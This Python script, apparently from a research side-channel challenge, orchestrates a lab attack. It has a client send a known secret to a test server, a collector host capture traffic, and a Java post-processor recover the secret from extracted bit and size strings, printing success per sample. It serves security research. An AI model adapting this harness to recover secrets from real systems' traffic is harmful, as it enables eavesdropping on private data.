# MIT License
#
# Copyright (c) 2017 Apogee Research
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


import socket
import sys
import json
import time
import subprocess
import os


def establish_benign():
    benign_host = 'clientNuc'
    benign_port = 9091
    try:
        s_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_.connect((benign_host, benign_port))
        return s_
    except:
        print("Error: Benign Establish")
        sys.exit(-1)


def establish_data():
    data_host = 'masterNuc'
    data_port = 9090
    try:
        s_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_.connect((data_host, data_port))
        return s_
    except:
        print("Error: Data Establish")
        sys.exit(-1)


def send_cmd(c_, message):
    to_send = message + "\r"
    c_.sendall(to_send.encode())


def receive_cmd(c_):
    msg_char = ""
    message = ""
    while msg_char != "\r":
        msg_char = c_.recv(1).decode()
        message += msg_char
    return message.strip()


def close_cmd(c_):
    c_.close()


def terminate_data(s_data_):
    # Inform data server complete
    send_data_command_3 = {"DATA_Command": "Complete"}
    send_cmd(s_data_, json.dumps(send_data_command_3))
    data_msg_in_3 = receive_cmd(s_data_)
    data_in_3 = json.loads(data_msg_in_3)
    assert (data_in_3["DATA_Status"] == "Complete")
    close_cmd(s_data_)


def terminate_benign(s_benign_):
    # Inform benign server complete
    send_benign_command_2 = {"BENIGN_Command": "Complete"}
    send_cmd(s_benign_, json.dumps(send_benign_command_2))
    benign_msg_in_2 = receive_cmd(s_benign_)
    benign_data_in_2 = json.loads(benign_msg_in_2)
    assert (benign_data_in_2["BENIGN_Status"] == "Complete")
    close_cmd(s_benign_)


def simulate_benign_request(benign_secret_int, remote_host, remote_port, s_benign_, sample):
    # Launch benign request
    time.sleep(2)
    send_benign_command_1 = {"BENIGN_Command": "Send",
                             "REMOTE_HOST": remote_host,
                             "REMOTE_PORT": remote_port,
                             "BENIGN_Request": benign_secret_int,
                             "Sample": sample}
    send_cmd(s_benign_, json.dumps(send_benign_command_1))
    print("\t\tStarting Benign Send")

    # Wait benign request
    benign_msg_in_1 = receive_cmd(s_benign_)
    benign_data_in_1 = json.loads(benign_msg_in_1)
    assert (benign_data_in_1["BENIGN_Status"] == "Response In")
    print("\t\tBenign Response Received:", benign_data_in_1["BENIGN_Response"])


def post_process_sc_data(extracted_bit_string, extracted_size_string):
    try:
        post_out = open("post_out.txt", "w")
        post_err = open("post_err.txt", "w")
        subprocess.call(
            ["java", "Category16_PostProcessing", extracted_bit_string, extracted_size_string],
            stdout=post_out, stderr=post_err)
        time.sleep(0.1)

        post_out.close()
        post_err.close()
        post_out = open("post_out.txt", "r")
        post_processed_secret_int = post_out.readline()[:-1]
        post_out.close()

        # Remove Files
        os.remove("post_out.txt")
        os.remove("post_err.txt")

        return post_processed_secret_int
    except:
        print("Unexpected error:", sys.exc_info()[0])
        sys.stdout.flush()
        return "Post-Processing Error"


def demonstrate_exploit(remote_host, remote_port, samples):
    # Establish data
    s_data_ = establish_data()
    # Establish benign
    s_benign_ = establish_benign()

    for sample in range(1, samples + 1, 1):
        print("Sample:", sample, "of", samples)
        sys.stdout.flush()

        # Inform data host to start
        send_data_command_1 = {"DATA_Command": "Start", "REMOTE_PORT": remote_port, "Sample": sample}
        send_cmd(s_data_, json.dumps(send_data_command_1))
        data_msg_in_1 = receive_cmd(s_data_)
        data_in_1 = json.loads(data_msg_in_1)
        assert (data_in_1["DATA_Status"] == "Started")
        print("\tA", "Starting")
        print("\t\tStarting Data Collection")
        sys.stdout.flush()

        # simulate benign actions
        benign_secret_int = "2888888882"
        simulate_benign_request(benign_secret_int, remote_host, remote_port, s_benign_, sample)

        # Stop data collection
        send_data_command_2 = {"DATA_Command": "Stop", "Sample": sample}
        send_cmd(s_data_, json.dumps(send_data_command_2))
        data_msg_in_2 = receive_cmd(s_data_)

        # Process data host response
        data_in_2 = json.loads(data_msg_in_2)
        assert (data_in_2["DATA_Status"] == "Stopped")

        # Assess data from data host
        if data_in_2["Sample_Status"] != "Sample Error":
            extracted_bit_string = data_in_2["Data"]["Bit String"]
            extracted_size_string = data_in_2["Data"]["Size String"]
            print("\t\tSecret To Store:", benign_secret_int)
            print("\t\tExacted Bit String:", extracted_bit_string)
            print("\t\tExtracted Size String:", extracted_size_string)
            post_processed_secret_int = post_process_sc_data(extracted_bit_string, extracted_size_string)
            if post_processed_secret_int == "Post-Processing Error":
                print("\t\tPost-Processing Error")
            else:
                print("\t\tPost-Processed Secret:", post_processed_secret_int)
                print("\t\tSuccess?:", benign_secret_int == post_processed_secret_int)
        else:
            print("\tData Collection Error")
        print("\tB", "Stopping")
        print("\t\tProceeding to Next")
        sys.stdout.flush()

    terminate_data(s_data_)
    terminate_benign(s_benign_)

    print("Complete")
    sys.stdout.flush()


def main():
    remote_host = 'serverNuc'
    remote_port = 8443
    benign_host = 'clientNuc'
    samples = 5

    print("Simulate Attack\n\tServer:", remote_host, ":", remote_port)
    print("\tClient:", benign_host)
    sys.stdout.flush()
    demonstrate_exploit(remote_host, remote_port, samples)


if __name__ == "__main__":
    main()
